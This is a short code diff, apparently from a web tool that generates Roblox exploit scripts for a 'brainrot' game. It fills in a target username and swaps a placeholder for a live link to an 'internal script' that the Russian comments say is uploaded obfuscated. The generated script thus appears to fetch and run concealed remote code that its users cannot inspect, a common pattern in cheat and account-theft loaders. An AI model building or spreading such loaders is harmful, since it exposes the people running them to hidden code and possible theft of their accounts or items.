@@ -134,8 +134,8 @@ if (generateBtn) {
 
         const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";
 
-        // ВНУТРЕННИЙ СКРИПТ (ТЫ ЗАЛЬЁШЬ ОБФУСЦИРОВАННУЮ ВЕРСИЮ)
-        const internalScriptUrl = "https://pastebin.com/raw/YOUR_INTERNAL_SCRIPT_URL";
+        // ТВОЯ ССЫЛКА НА ВНУТРЕННИЙ СКРИПТ
+        const internalScriptUrl = "https://protector-mu.vercel.app/s/wvNqhkSEC68mGcGo";
         
         const finalScript = `-- ========== CONFIG ==========
 getgenv().TARGET_NAME = "${nick}"
